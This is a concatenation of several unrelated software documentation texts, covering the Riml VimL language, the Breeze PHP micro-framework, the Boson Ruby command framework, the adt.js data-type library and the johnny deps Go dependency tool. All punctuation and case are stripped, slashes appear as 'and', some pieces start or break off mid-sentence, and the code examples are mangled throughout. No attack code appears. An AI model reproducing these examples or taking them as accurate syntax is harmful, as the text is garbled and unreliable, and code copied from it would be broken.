frenchtoenglishtranslationobj translate function snr s sid s frenchtoenglishtranslationtranslate echo sorry i don t know that word return frenchtoenglishtranslationobj end endfunction end end function sid s frenchtoenglishtranslationtranslate dict if self input bonjour translation new echo hello frenchtoenglishtranslation bonjour else translation translate echo sorry i don t know that word endif endfunction let s translation s translationconstructor bonjour call s translation translate hello classes that inherit must have their superclass defined before inheritance takes place in this example translation is defined first which is legal since translation has an initialize function and frenchtoenglishtranslation doesn t frenchtoenglishtranslation instances use the initialize function from translation  and new instances must be provided with an input argument on creation basically if a class doesn t provide an initialize function it uses its superclass s if you look at the last line of riml in the previous example you ll see that it doesn t use viml s builtin call function for calling the translate method on the translation object riml can figure out when call is necessary and will add it to the compiled viml a base class and inheriting class can have different scope modifiers for example if you had a script local base class and wanted to extend it but have the extending class be global this is not a problem simply class g globalclass scriptlocalclass  class car function s carconstructor make model color def initialize make model color let carobj self make make let carobj make a make self model model let carobj model a model self color color let carobj color a color end endfunction class hotrod car function s hotrodconstructor make model color topspeed def initialize make model color topspeed let hotrodobj self topspeed topspeed let hotrodobj topspeed a topspeed super make model color let carobj s carconstructor a make a model a color end call extend hotrodobj carobj let hotrodobj drive function snr s sid s hotroddrive defm drive return hotrodobj if self topspeed  endfunction echo ahhhhhhh else function sid s hotroddrive dict echo nice if self topspeed  end echo ahhhhhhh end else end echo nice endif newcar new hotrod chevy  mustang  red   endfunction newcar drive let s newcar s hotrodconstructor chevy  mustang  red   call s newcar drive ahhhhhhh use of super is legal only within subclasses if arguments are given these arguments are sent to the superclass s function of the same name if no arguments are given and parentheses are omitted super as opposed to super  every single argument is passed to the superclass s function this mirrors ruby s approach super can be called from an initialize constructor function a public member function defm  or a non public function def an error is given during compilation if no superclass function with that name is defined compiling riml  to compile a riml file named example riml that resides in the current directory riml c example riml this will create a new viml file named example vim in the current directory it s useful to split a project into many files for example imagine we re creating a plugin called awesome that does something totally awesome and it relies on another library we wrote called my framework that s also written in riml somewhere in awesome riml  we have the line rimlsource myframework riml this will compile the file my framework riml and create a viml file named my framework vim in awesome riml  that line will be compiled to source myframework vim this process is recursive meaning that if my framework riml riml source s other files then those files will be compiled as well the previous example would only work if my framework riml were in the current working directory where the compilation command riml c was issued in order to tell the compiler where to look for files that are being riml source d you can provide an environment variable or a command line option of colon separated paths for example riml c awesome riml s firstdir seconddir with this command the compiler will look for files that are riml source d first in and first dir then in and second dir if not found in first dir the same can be achieved by riml c awesome riml rimlsourcepath firstdir seconddir paths can either be relative or absolute the sourced files that are compiled will end up in the same directory in which they were found sometimes it s useful to have many files in development but to include a file s contents into another file during the build process this is much like the c preprocessor s include directive to include a file named my lib riml rimlinclude mylib riml this compiles the file and includes its content in place of the riml include directive itself much like riml sourcing the process is recursive if my lib riml includes files these files are also compiled and will be part of the inclusion note that riml include does not create a new file like riml source does like riml source riml include looks in a set of ordered paths to find the files to include with the default being the working directory in which the compilation command was issued here are some examples of commands that set the include path riml c main riml i lib helpers debug riml c pluginname riml rimlincludepath lib modules since riml include acts as a sort of preprocessor it cannot be issued inside of a conditional function or anything dynamic it must be at the top level non nested also if you are included lots of files you don t have to worry about multiple inclusion or which file should be included before which because during the compile phase the class dependencies are resolved and the inclusions are re ordered based on this info it s easiest to include all the dependencies you need to include for each file without worrying about repetitions or ordering to see how you can treat a list of inclusions as a kind of header file that other files include incompatibilities with viml  riml aims to be as compatible with viml as possible therefore any legal viml should be legal riml as well unfortunately this is not  possible as vim is an old and cryptic beast and trying to create grammar for every possible viml construct would be a nightmare in practice however when i ve transformed plain old viml plugins to be riml compatible only a couple of needed to be placed in strategic locations for it to be valid riml this is explained below fortunately there are some pretty simple rules to follow to get valid riml when doing anything with autocommands normal commands set ranges etc simply do autocmd bufenter blahblah that is prepend to the line when a line starts with  it passes directly through the compiler and no transformations occur this includes string interpolation which is ignored as well in riml when a line starts with it s called an ex literal ex literals are necessary for the following autocommands command definitions ranges h cmdline ranges normal h normal mappings augroups basically anything that isn t a class number string list dict function call function definition loop or if construct variable definition or unlet etc needs to be an ex literal in riml note that like echo which isn t a builtin function h functions but is still legal riml execute is also allowed as it takes a string this is extremely useful as we can now use execute with a string that allows interpolation imagine having to write a grammar rule for the following set statusline and strlen fenc fenc none  file encoding since there s no string after the and  it makes it very hard so when the compiler can t parse a file correctly prepend those lines with and all should be well in viml there are abbreviations for everything even keywords like function can be abbreviated in riml abbreviations are not allowed this makes riml much easier to read and understand everything else that works  everything not mentioned above as illegal is legal riml here s a short non comprehensive list of constructs which are legal riml but not mentioned in any of the examples try and catch and finally blocks and throw curly brace variable and function names while and until loops ternary operators exponents line continuations autoloadable variables and functions h autoload let unpack h let unpack much more projects using riml

727318, breeze is a simple and intuitive micro framework for php   and the most basic example of a breeze application is requireonce breeze php get and  function echo hello world getting started  for help installing and configuring the breeze framework see the install md file all the instructions in this tutorial will assume that you already have a basic application running this means that most of the examples will leave off the following required elements and and plugins go here requireonce breeze php and and example code goes here the requireonce statement is needed to include the framework libraries and run is needed to start the routing process without these elements most examples will not run the routing api involves associating http requests with php functions for example the following code would print hello world if a get request were made for and get and  function echo hello world the routing system works with the  main http request methods get post put delete get and  function echo you made a get request post and  function echo you made a post request put and  function echo you made a put request delete and  function echo you made a delete request routes are matched in the order they are declared and once a route is matched no other routes will be matched this means you have to be careful when organizing your routes for example get and  function echo made it here get and  function echo this will never get echoed routes can be matched using a basic string or a regular expression the one caveat is that regular expressions can not be delimited by and as they are indistinguishable from basic strings for example and my and path and is could be a basic string or a regular expression the breeze convention is to use the semicolon to delimit regular expressions but any valid delimiter will due get and basic and string and match  function get and basic and string and w and  function echo wow regexp matching of course matching regular expressions isn t too useful unless you can capture groups accordingly breeze passes any matches from your route as the second argument to your function get and hello and w and  function app params echo hello params  get and hello and name w and  function app params echo hello params name in some cases it may be helpful to associate one php function with multiple request methods we will describe a number of uses for this after some more advanced techniques have been introduced but a simple example is detailed below any array post  put  and  function echo html  and xhtml  forms don t really support the put method this is one way to handle it any and  function echo this matches all request methods the solution described above works but it s certainly not the most graceful or preferred solution to this problem a standard exists in several other frameworks where you can use a hidden form field to indicate the request method you wish to use this allows you to keep your controller code concise while addressing the shortcomings of html in the html template php form method post action and processmyform controller php put and processmyform  function echo this will be echoed when the form is submitted in some cases routes patterns require a global modification such as prepending a base path when the application is running in a subdirectory of the document root and web server level url rewrites are not an available or desirable option route filters are callbacks that are executed on each route pattern before it s evaluated against the current request bootstrap php config basedir  and subdir route function pattern return config basedir pattern controller php and and this route will actually resolve to and subdir and foo app get and foo  function and and earlier we said once a route is matched no other routes are matched this isn t entirely true a mechanism exists which allows escaping from an action to continue routing this is helpful in a variety of situations one common example is to do some pre processing for a certain set of routes consider the following code and and show a post get and posts and id d and  function and and load a post and display it and and edit a post get and posts and id d and and edit  function and and load a post and display an edit form put and posts and id d and  function and and load a post and update it and and delete a post get and posts and id d and and delete  function and and load a post and display a delete form delete and posts and id d and  function and and load a post and delete it if you ve been paying attention you probably noticed every method that starts with and posts and id is loading a post what sense does it make to repeat this logic  times instead you can do the following any and posts and id d and  function and and load a post pass now all methods that start with and post and id will match this route and load a post the pass function tells the framework to exit out of the current action and continue routing this shortcut saves us a lot of keystrokes and removes duplication and complexity from our code which is always helpful don t use the pass function when you really want to send somebody to another url to do this you can use the redirect function get and  function and and sends a  response code you can also specify a different response code for redirects get and  function and and sends a  response code sometimes you want an action to be executed no matter what your first instinct might be to use the pass function for this any  function echo this should always be executed pass while this works it s not ideal for one using a route means you must be cognizant of ordering this route will only execute if it s included at the very top of your script also what happens if you want something to execute after every action putting a route like this at the bottom of a script won t work as expected this is where filters come in filters allow us to define functions that always get executed before function echo this will be executed first before function echo this will be executed second after function echo this will be executed next to last after function echo this will be executed last filters are always executed in the order they are defined but you can define them anytime before you call the run function this means that the following works as expected get and  function echo world before function echo hello conditions  another common use of the pass function is to filter through routes if they don t meet a certain condition imagine you want to do something special on your homepage for iphone users one way to do this is get and  function if stristr server httpuseragent  iphone false pass and and do something special for iphones get and  function and and everyone else will see this this works but it s a little bulky the conditions api provides a cleaner interface for replicating this functionality condition useragentcontains  function agent return stristr server httpuseragent  agent false get and  function condition useragentcontains  iphone and and do something special for iphones get and  function and and everyone else will see this and since checking a user agent against a known pattern is such a common task we ve predefined a condition in the framework that does just that it s called useragentmatches get and  function condition useragentmatches  and iphone and i and and do something special for iphones get and  function and and everyone else will see this another predefined condition is called hostnameis you may use it in the following way get and  function condition hostnameis  www mysite com and and do something special for www mysite com get and  function and and everyone else will see this templates  eventually you ll need a clean way to delineate your views from your controllers to address this need breeze provides a very simple engine for processing templates get and  function display index index php h hi from the template and h you ll find that you also need a way to pass variables from your controllers to your templates for this breeze has a template function that can be used to assign and read template variables get and jeff  function template message  jeff is cool echo template message and and prints jeff is cool display index index php h php echo message and h you can also make multiple assignments with a single template call get and jeff  function template array title this is a title  message this is a message display index index php h php echo title and h for your convenience breeze allows you to display a template and assign the template variables in a single statement get and breeze  function display index  array message breeze is very cool index php h php echo message and h breeze actually has one more way to define template variables this method exists for the plugin architecture which we ll discuss in more detail later but it can be helpful when working with multiple template variables at once get and special  function app app message this is another way of defining template variables this mostly exists for working with the plugin architecture but can be useful when working with actions that declare a large number of template variables display index index php h php echo message and h and of course though it s not encouraged you can use these three different methods interchangeably get and mixed  function app template message  jeff is cool app message now the message has changed display index  array message now the message has changed again index php h php echo message and h most websites have a common header and footer breeze introduces what is known as a layout file which allows for defining a header and footer in a single file the default location for this is a file called layout in the root of your views directory if this file doesn t exist breeze will simply render your pages without a layout get and  function display index layout php head title layout example and title and head body php echo layoutcontents and body index php h hello from the index and h as applications get larger they necessitate more than one layout to change the layout from within an action you can use the layout function get and  function layout secondarylayout having to call the layout function in every action isn t very concise a possible improvement is to use the before filter or the pass shortcuts we discussed earlier and and all urls that start with and posts and will use the posts and layout file any and posts and  function layout posts and layout pass sometimes you don t want to display a template immediately to render the contents of a template without displaying it you can use one of the following functions get and  function template title  this is a title withlayout fetch index  array message this returns the template with the layout withoutlayout partial index  array message this returns the template without the layout index php h php echo title and h since partial returns templates without the layout it is ideal for using inside templates index php h my posts and h foreach posts as post echo partial showpost  array post post endforeach showpost php h php echo post title and h with breeze you are free to use any template engine you choose the default distribution of breeze includes plugins for the smarty and dwoo template engines creating your own plugins is relatively trivial and described in the plugins section to use an alternate template engine simply require the plugin file before requiring the breeze php file controller php requireonce breeze and plugins and smarty php requireonce breeze php get and  function template message  hello from smarty display index index php h message and h one downside of some rd party template engines is they have their own way of defining functions this means that some of our functions aren t available consider the following example index php h hello and h echo partial message message php try to do this same thing in smarty and you ll get a syntax error index tpl h hello and h partial message message tpl to solve this problem every template receives an instance of the current app this variable is called breeze by default but you can configure the name using methods described in the next section using this information we can fix the syntax error we received in the last example index tpl h hello and h breeze partial message message tpl unfortunately smarty has another shortcoming unlike dwoo smarty has no easy way to create an array inline for example the following will give you another syntax error index tpl h hello and h breeze partial message  array message world message tpl to address this problem we ve created a custom plugin for the smarty engine called partial you can use it in the following way index tpl h hello and h partial file message message world message tpl for more information on how the breeze variable works be sure to read the plugins section configurations  the breeze template api works well out of the box but you may find yourself wanting to change the default template location or the default template extension to do this you will need to use the config function config templatedirectory  and path and to and my and views config templateextension  tpl echo config templateextension and and echoes tpl it is also possible to assign multiple configurations in a single statement config array templatedirectory and path and to and my and views  templateextension tpl echo config templateextension and and echoes tpl the default configuration values are templateengine php  and the template engine and templateoptions array  and the extra options for the template engine and templatedirectory and views  and the base directory for all templates and templateextension php  and the common extension for all templates and templatelayout layout  and the default path to the layout file and applicationvariable breeze  and the template variable that holds the current application object and errorsbacktrace true and if error templates should include backtraces and unfortunately things don t always go as expected eventually a resource will become unreachable a user will provide some funky input or a bug will be introduced into your production environment whatever the case your application needs to be equipped to handle such events without configurations breeze will trap any uncaught exceptions that bubble up or any errors that are dispatched from within the framework if a layout is defined breeze will use it for displaying errors otherwise it will use a minimal layout the simplest way to test the default behavior of the breeze errors framework is to dispatch some errors and see what happens we said earlier that the breeze framework will trap any uncaught exceptions that bubble up let s test this out get and  function throw new exception oh no what happened using the default configurations you should see your error message wrapped in your layout if you have one defined and a stack backtrace to help you find out where the error occurred stack backtraces can be useful when developing but you almost certainly want to disable them in your production environment to do this you can use the following code config errorsbacktrace  false sometimes you want exceptions to be interpreted as specific http errors by specifying an exception code that coincides with an http error code the appropriate header will be sent automatically get and  function throw new exception oops i think i misplaced that page   and and  header is sent and since throwing exceptions can be a bit verbose at times we ve defined a more concise syntax for dispatching errors get and  function error  get and another and url  function error this is a message get and even and another and url  function error  this is a message the error function when used in this way is essentially just a shortcut for throwing a generic exception this is however the preferred method so we recommended you use it in your controllers unless you have a compelling reason not to dispatching errors is only half the story the default error handling while helpful during development is not exactly appropriate for a production environment you ll want to define error handlers to take the appropriate actions in your production environments by design error handlers work almost identically to the routing system and and handle  s error  function template title  page not found display  and and handle all codes   error range   function display generic  array title oh no something bad happened you can also define a catchall error handler that will catch any errors that have no associated handlers and and if no other handlers catch your error this will error function display error  array title oh no something bad happened additionally you can define error handlers based on specific exception types error myexception  function display myexception  array title why does this exception have such a generic name error array myexception  myotherexception  function display exceptions  array title even more exceptions yay just like the routing system handlers receive and instance of the current app as their first argument more importantly the second argument is an instance of the exception that was thrown that ultimately triggered the error error function app exception echo exception getmessage and and prints page not found get and  function error  page not found one of the more useful features of breeze errors is that they provide a nice shorthand syntax for dispatching http error statuses error  and and header http and    not found breeze provides a status function for accomplishing the same functionality for other http statuses status  and and header http and    no content status    and and header http and    no content you can also use status to inspect the status message that is going to be sent for the current request status  and and header http and    no content echo status and and http and    no content sometimes you ll find yourself repeating the same routes configurations conditions templates error handlers etc in most of your applications breeze has a very logical solution for this any code that you write using the breeze framework can be ported to a plugin that can be used by other applications additionally breeze offers the possibility of creating your own breeze functions meaning you can extend the framework s core functionality until your heart s content the best way to learn the plugin system is through example for starters you might want to take a look at the plugins that are included with the breeze framework when in doubt use one of these plugins as a skeleton for the plugin you are trying to write the most basic example of a plugin would be helloworld php namespace breeze plugins helloworld use breeze application requireonce breeze and application php application register helloworld  function app app get and  function echo hello world now what s going on here it s actually rather simple but it requires a little bit of insight into how the breeze framework actually works a bit of magic is happening behind the scenes when you call requireonce breeze php the truth is while all of this code has seemed pretty procedural up to this point it s really just a trick every function call you are making is actually delegating the work to a system of objects that are working in the background get  post  template  config  et al are all just shortcuts for a more verbose object oriented interface in fact it s possible to turn off these shortcuts so that we don t pollute the global scope but we won t dig into that until the next section with that knowledge in hand we can start to decipher this plugin code breeze application is the class which all of your functions like get and post are delegated to when we call the static breeze application register method we are adding new functionality to this class which will be available when new instances are created the first argument for the breeze application register function is the name you want to give your plugin this is helpful as it gives us a way to remove this plugin if we decide we no longer want it later on you can remove a plugin using the following syntax breeze application unregister hello the second argument is a function that will be called when a new instance of breeze application is created this is what enables you to define routes configurations templates etc when this function is called we get an instance of the current application which we can use to call all of our familiar functions note you must use the app method syntax instead of the method shortcuts when defining plugins helloworld php namespace breeze plugins helloworld use breeze application requireonce breeze and application php application register helloworld  function app and this is an instance of breeze application ie your current app and and and this is the same as calling get after your application has started app get and  function echo hello world and and this is the same as calling config after your application has started app config this  is cool and and shorthand for assigning a template variable app something cool and and the longhand versions also work app template something  cool controller php requireonce breeze and plugins and helloworld php and and this sets up the plugin requireonce breeze php and and this creates an instance of breeze application and runs your plugin code if you haven t used namespaces in php yet you might be confused by the backslashes in the class names this is simply how you express namespaces in php we encourage people that are writing plugins to use the appropriate namespaces in the next section we demonstrate how to use the breeze framework while not polluting the global scope with all the shortcut functions if you don t namespace your plugin appropriately you will undermine this aspect of the framework and people will be less likely to use your plugins the breeze standard for plugin namespaces is template engines should use the breeze view driver namespace and all other plugins should use breeze plugins yourpluginnamehere namespace as we mentioned earlier it s possible to create plugins that include templates when doing so you must keep a couple of things in mind first you should always use the default php template engine never rely on a user to have a certain template engine available second you should always use the breeze application variable discussed in the templates section when calling breeze functions this assures that your application works even when developers using your plugin have the breeze shortcuts disabled so far we ve only showed you how to use existing framework components to bundle bits of functionality together that you can share with other apps what if you want to create your own framework elements to do this you can use the helper function helper addnumbers  function num num return num and num get and  function echo addnumbers get num  get num okay this isn t exactly useful you could ve have just created a normal function right function addnumbers num num return num and num get and  function echo addnumbers get num  get num these two examples may look similar but there s actually a very subtle difference the first example creates a function that is actually attached to the breeze application class we described earlier we are just using the same trick to make it seem like a normal function this means that this function doesn t pollute the global scope if a user turns off shortcuts and since this method protects the global scope it s safe to use when defining plugins auth php namespace breeze plugins auth use breeze application requireonce breeze and application php application register auth  function app app helper auth  function user redirecturl use app if user name admin app redirect redirecturl  controller php requireonce breeze and plugins and auth php requireonce breeze php get and  function auth session user  and login the global scope  let s be honest if you re using php your global scope is already a bit compromised with the introduction of namespaces though php has finally given us some tools to help combat this problem and while having functions like get and display in your global scope may save you some keystrokes it isn t exactly the ideal situation especially for larger applications fortunately breeze allows you to turn off these shortcut functions and use a slightly more verbose syntax to protect your scope controller php namespace breeze examples scope use breeze application requireonce breeze and application php app new application app get and  function app app display index app run once you ve disabled the breeze shortcuts you will need to use the breeze application variable discussed in the templates section when calling breeze functions index php h hi there and h be sure to checkout the namespaces examples for a more complete treatment on protecting the global scope that s all folks  if you read this entire tutorial you should be well on your way to creating breeze applications be sure to check out the included examples and plugins for more examples of breeze in action

194514, boson is a modular command and task framework thanks to its rich set of plugins it differentiates itself from rake and thor by being usable from irb and the commandline having automated views generated by hirb and allowing libraries to be written as plain ruby works with on all major rubies for ruby    starting with   boson has changed significantly please read the upgrading older version or if your reading about boson has been rewritten to have a smaller core no dependencies with optional plugins to hook into its various features the major focus of   has been to provide an easy way for third party gems to create their executable and define subcommands with options nicely formatted docs are available for a gem with an executable bin and cow require boson and runner class cowrunner boson runner option urgent type boolean def say text options text capitalize if options urgent puts text def moo puts moooo cowrunner start you can now execute cow with say and moo subcommands cow say hungry hungry cow moo moooo use say s urgent option cow say hungry urgent hungry you ll notice that this syntax is powerful and concise and is very similar to thor s api subcommands map to ruby methods and the class represents the executable for some examples of executables see makes sense to compare them first what i consider pros boson has over thor boson is designed to handle plugins this means it core parts are extendable by modules and core components like commands can have arbitrary metadata associated with them has commands that are easily testable whereas thor has options that automagically appear in command methods boson explicitly passes options to its command method as a hash i e myrunner new subcommand arg verbose true this also allows commands to just be called as ruby with no magic to consider supports custom user option types i e creating a date option type see boson options supports custom method decorators i e methods like desc that add functionality to a command while boson supports option options desc and config out of the box users can create their own automatically creates usage for your subcommand with thor you need to manually define your usage with desc desc some usage  some description is lenient about descriptions describe commands at your leisure with thor you must define a desc has no blacklist for command names while thor has a due to its design with boson you can even name commands after kernel method names but tread with caution in your own runner class allows for user defined default global options i e help and commands i e help this means that with a plugin you could have your own additional default options and commands shared across executables see the extending section below allows default help and command help to be overridden and extended by subclassing runner displayhelp and runner displaycommandhelp respectively provides an optional custom rc file for your executable simply set env bosonrc to a path i e and myprogramrc this rc file loads before any command processing is done allowing for users to extend your executable easily i e to add more subcommands for an example see now for pros thor has over boson thor is widely used and thus has been community qaed thoroughly supports generators as a major feature is more stable as its feature set is mostly frozen is used by rails and thus is guaranteed support for some time supports ruby    can conveniently define an option across commands using classoption boson may add this later todo i m sure there s more change your requires and subclass from boson runner instead of thor delete the first argument from desc usage is automatically created in boson rename methodoption to option for options with a type option make sure it maps to a symbol i e array or boolean if left a string the option will be interpreted to be a string option with that string as a default classoption doesn t exist yet but you can emulate it for now by defining your class option in a class method and then calling your class method before a boson plugin is a third party library that extends boson through its extension api any boson class and module that includes or extends a module named api or apiclassmethods provides an extension api examples of such classes are boson barerunner boson command boson inspector and boson library as an example let us extend what any boson based executable does first extend boson barerunner start module boson module customstartup def start super additional startup boson barerunner extend boson customstartup notice that extend was used to extend a class method to extend an instance method you would use include also notice that you use super in an overridden method to call original functionality if you don t you re possibly overridden existing functionality which is fine as long as you know what you are overriding if you want to gemify your plugin name it boson pluginname and put it under lib and boson and pluginname the previous example would go in lib and boson and customstartup rb to use your plugin a user can simply require your plugin in their executable for many plugin examples see to use a plugin just require it for an executable require boson and runner require boson and myplugin myrunner start for the boson executable just require the plugins in and bosonrc boson allows for custom default options and commands this means you can add your own defaults in a plugin and use them across your executables to add a custom default command simply reopen boson defaultcommandsrunner class boson defaultcommandsrunner desc whoomp def whoomp puts whoomp there it is to add a custom global option add to boson runner globaloptions boson runner globaloptions update verbose type boolean desc verbose description of loading libraries custom global options are defined in the same format as options for a command if the issue is about upgrading from old boson please file it in motivation for the new boson is all the damn executables i m making boson stands on the shoulders of these people and their ideas contributors mirell martinos celldee zhando yehuda

as a singleton instance and does not need to be instanciated recursive types  let s define a linked list type var adt require adt var list adt data function return nil null cons head adt any tail adt only this coffee data any only require adt list data nil null head any tail only this macros data list head  tail list note that we ve introduced a lambda to house our definition with our maybe type this wasn t necessary because we didn t need to reference the adt itself but here we want to use adt only to put a constraint on the value of tail so it can only contain list types if we left out the lambda and just used the object literal syntax list wouldn t exist when we try to pass it to adt only and we d get a referenceerror see the end of this document for an alternative that does not require a lambda and now let s put it to good use var list list cons  list cons  list nil and and record attributes list head  list tail tostring cons  nil and and deep equality var list list cons

our new one serializes to an integer days mon tojson  macros enum days sun  mon  tues  and and etc note that the value you give it does not affect the comparison methods that is determined solely by insertion order enums aren t really special they are just normal adts with some extra behavior you are not restricted to only using singleton types like we did above you could just as easily have an enum of record types too likewise you can also give a value to any singleton type null is just the default value and often times a good representation of the type nothing nil empty etc sometimes you just need a type that exists by itself use adt newtype as a shortcut and and instead of this var lonely adt data lonely value adt any lonely lonely lonely and and do this var lonely adt newtype lonely  value adt any macros newtype lonely value constraints  adt js has two builtin value constraints any  to represent the lack of a constraint and only  to restrict a value to certain types and and any is an id function adt any   adt any foo foo and and only is a constraint factory var onlynumbers adt only number var onlystrings adt only string var onlyprimitives adt only number string boolean

tostring var onlystrings adt newtype value tostring onlystrings  value  sealing your adt  all adts are left open by default meaning you can add types and fields to it at a later time you can close your adt by calling seal var maybe adt data var nothing maybe type nothing var just maybe type just  value adt any and and close it maybe seal and and calling type results in an error maybe type foo and and error object literal insertion order  astute readers might notice that adt js relies on a controversial feature the host engine maintaining insertion order of keys in object literals it s true that the javascript spec does not require this feature however it has become a defacto standard and all engines implement this feature for the string keys we are using adt js also offers a safe api that does not rely on this feature var list adt data function type list type nil  null type cons  adt record function field field head  adt any field tail  adt only list in fact this is just the desugared form of the terse api see the end of this document for an alternative that uses chaining instead of lambdas and closures immutability  javascript is inherently mutable and so adt js can t guarantee immutablity only facilitate it by using set instead of direct attribute assignment we get safe immutable structures but if we were to store say an object literal as a value we could certainly get a reference to it and mutate it affecting any data that might be sharing it var obj foo bar var just just obj var just just obj just value foo baz just value foo baz deep equality  adt js only performs deep equality on adt js types it does not perform deep equality on native arrays or objects anything that is not an adt js type is compared using strict equality var arr    var just just arr var just just arr just equals just true just equals just    false if you would like to extend this behavior you can override the default method for equality on native js types for example if you were using lodash and and deep equality on all native js types objects arrays regexps dates etc adt nativeequals  isequal adt js types all have a clone method for returning a safe copy of a data structure as with deep equality it only clones adt js types and copies arrays and objects by reference singleton instances will always return the same instance when copied var just just  var just just clone just value  just just as with equality you can extend the default cloning behavior for native js types using lodash adt nativeclone  clonedeep overriding apply  for some types it can be nice to have some sugar on the parent type for example it would be nice if you could build a list like you would an var arr array    and and wouldn t this be nice var list list    list tostring cons  cons  cons  nil adt js detects when you override your apply method and can use that to create your types list apply function ctx args and and hypothetical fromarray function return list fromarray args pattern matching  data types made with adt js have builtin support for sparkler a pattern matching engine for javascript data tree value  left tree right tree function treefn case empty empty case node   case node left node  left  api variety  adt js has a versatile api so you can define your types in a way that suits you some ways are very terse while others are safer don t rely on object insert order if you don t like defining recursive types within a function you might like var list adt data var nil list type nil var cons list type cons  head adt any tail adt only list this has the advantage of shaving off a few lines but requires some name duplication another way of defining safe types is to use chaining instead of a closure var list adt data var nil list type nil var cons list type cons  field head  adt any field tail  adt only list depending on you needs there should hopefully be an easy terse way of defining your types using macros  npm install g sweet js npm install adt sjs m adt and macros myfile js in your file you don t need to require adt the macro will load it for you when you define a data type one nice property of the macros is that the data constructors are automatically brought into the surrounding scope data list head  tail list and and nil and cons are in scope var list cons  cons  nil when declaring your constraints the macros try to do the right thing if the identifier for the constraint starts with an upper case letter it will use an adt only constraint if it starts with a lower case letter it will use it as is you can also inline a function literal as a constraint nathan faubion natefaubion

11530737, provides minimalistic dependency versioning for go repositories using git its primary purpose is to help create reproducible builds when many import paths in various repositories are required to build an application it s based on a perl script that provides subcommands for retrieving or building a project or updating a dependencies file called godeps  listing first level imports for a project install johnny deps by cloning the project s github repository and running the provided scripts like this cd johnny deps and configure prefix and your and path make install the prefix option to configure is not mandatory it defaults to and usr and local if not provided but you d have to install as root in that case the binary will end up at the bin subdirectory under the prefix you choose make sure you have that location specified in your path note that perl is required although that s probably provided by your system already also go git and if you re using makefiles make johnny deps is all about project dependencies each project should have a file called godeps at its root listing the full set of first level dependencies i e  all repositories with go packages imported directly by this project the file may be omitted when empty and looks like this github com and vividcortex and godaemon fdfffaaefeadbcfd github com and vividcortex and log ffbbebcfbcfdaddccebff github com and vividcortex and mysql fbfafdcbfcebdfe the first column identifies the dependency the second is the commit identifier for the exact revision the current project depends upon you can use any identifier git would accept to checkout including abbreviated commits tags and branches note however that the use of branches is discouraged cause it leads to non reproducible builds as the tip of the branch moves forward jd is johnny deps main binary it s a command line tool to retrieve projects from github check dependencies reposition local working copies according to each project s settings building and updating it accepts subcommands much like go or git do jd global options command options project global options apply to all commands some allow you to change the external tools that are used go git and make in case you don t have them in your path or otherwise want to use a different version there s also a v option to increase verbosity that you can provide twice for extra effect note that the tool runs silently by default only displaying errors if any it s worth noting that all parameters are optional if you don t specify a command it will default to build see building below if you don t specify a project jd will try to infer the project based on your current working path and your setting for gopath if you re in a subdirectory of any of the gopath components and you re also in a git working tree jd would be happy to fill up the project for you when in doubt check jd help retrieving a go application with johnny deps is just as easy as retrieving a single base project run jd get and the full application with all transitive dependencies will be set up in your environment here s what we d type for one of our applications jd get github com and vividcortex and api hosts johnny deps will look for all required projects in your gopath  and download those missing to the first component of gopath it will even create the directory stated in your gopath if it doesn t yet exist as jd traverses the graph of dependencies it checks whether version conflicts exist if it happens to detect one it will abort with a message like this version mismatch detected for github com and vividcortex and core cebbfbbeaeace referenced by github com and vividcortex and api hosts github com and vividcortex and config github com and vividcortex and nap but dfeffdbeafccad referenced by github com and vividcortex and shard here the tool is telling you that two different versions of core are being included the first is the commit identifier at the top that is shared as a dependency for the three projects that follow but shard  on the other hand is including a different commit for core  shown at the last line if no version mismatch is found you ll end up with all projects required to build the application you were interested in api hosts in the example above besides retrieving required projects jd get will reposition local copies whether they existed already or were just cloned to the version stated in godeps files furthermore if you re aiming at a specific commit as recommended  jd does an extra effort trying to checkout a branch whose tip matches that commit as opposed to leaving you in a detached head state that s most probably what you want cause it s probably a work in progress and you ll be adding commits to that branch if you prefer a detached head instead provide the d flag to get when choosing a branch to checkout for a given commit identifier jd will first search among all locals if there s none whose tip matches the commit jd will try remote tracking branches instead among those matching jd selects one with a local branch by the same name having the remote as an upstream branch if there s one available that remote branch is merged into the local and the latter is checked out for use otherwise jd keeps one of the matching remotes with no local branch by the same name and checks out a new local branch with that remote set as upstream if local branches existed for all candidate remotes but none of them had the remote by the same name set as upstream then jd would abort with an appropriate message in that case you should either review your local branches cause there s possibly an upstream setting missing or otherwise use d to checkout in detached head mode in any case if there s more than one choice and you re running with double v  you d get a message displaying the other options as well it s worth noting that jd favors local operations as much as possible to avoid long round trips to remote repositories hence remotes won t be fetched if the required revision is found locally that s particularly relevant when including a branch name at the godeps file cause if found locally the branch will not be updated with remote changes note also that unless it actually needs to move to a different release jd will not insist in that your working copy is clean this is good from a developer s point of view cause it allows you to play with the application trying modifications or fixes in the whole code base without jd complaining if the project you re interested in is not present in gopath  jd get will clone it from the remote repository and checkout the master branch but once you have a local copy jd will never checkout a different revision it will change revisions for dependencies but not for the main project you provide to jd get you may reposition the working copy to your liking using git commands jd will be happy to adjust dependencies accordingly however if you want to force your main project into a specific revision even before you have a local copy you can use the r parameter to jd get  like so jd get github com and vividcortex and api hosts r my release where the argument to r can be anything you can checkout from git a commit identifier abbreviated or not  a branch or a tag after working copies for all projects in the application are set jd get runs a check on first level dependencies for the main project i e  the one either you specified on the command line or jd inferred from your current directory the check is run against the result of go list jd will complain if the sets don t match exactly displaying both missing and not required projects if that s the case you need to fix your godeps file see updating since building is what you ll be doing most of the time jd conveniently defaults to build if no command is provided furthermore jd may be able to retrieve the project out of your current working directory see introducing the tool above hence you d typically be able to compile by typing only jd at the command prompt not even your location within the project tree matters the tool works equally fine if run from deep inside the hierarchy before the actual building process jd runs the equivalent of a jd get command that s how it makes sure that you re actually using the correct versions of all dependencies keep in mind though that if your local copies were already set to the correct revisions it s okay to have local changes even in godeps files the implicit get run by build  and the choice of build as the default command make the tool particularly easy to use to build projects you don t even have the following command retrieves the full dependencies for the application and builds jd github com and vividcortex and api hosts furthermore since the r option to build is actually passed along to the implicit get  you can readily set up a specific version by appending the appropriate r to the command above the same behavior goes to the d option to build johnny deps calls go build at the project s root to build but in order to accommodate special needs jd checks for custom instructions first resorting to go build only if there are none the highest priority goes to the make utility if there s a file called makefile or makefile at the project root then make is run if an executable file called build is found then that will be invoked instead otherwise the tool resorts to go build and there s no need for a script if you need to go install and instead johnny deps will use the later if you ask it to install rather than build however keep in mind that this has to be explicitly asked for jd defaults to build if no command is provided the rest of the process works exactly like it does for build  including the attempts at make and the build script even though jd makes no difference between build and install when custom scripts are used the command name is made available in case different actions are required in scripts themselves this is published as the jdaction environment variable johnny deps can t decide which releases to use from the project s you import but it can help writing the 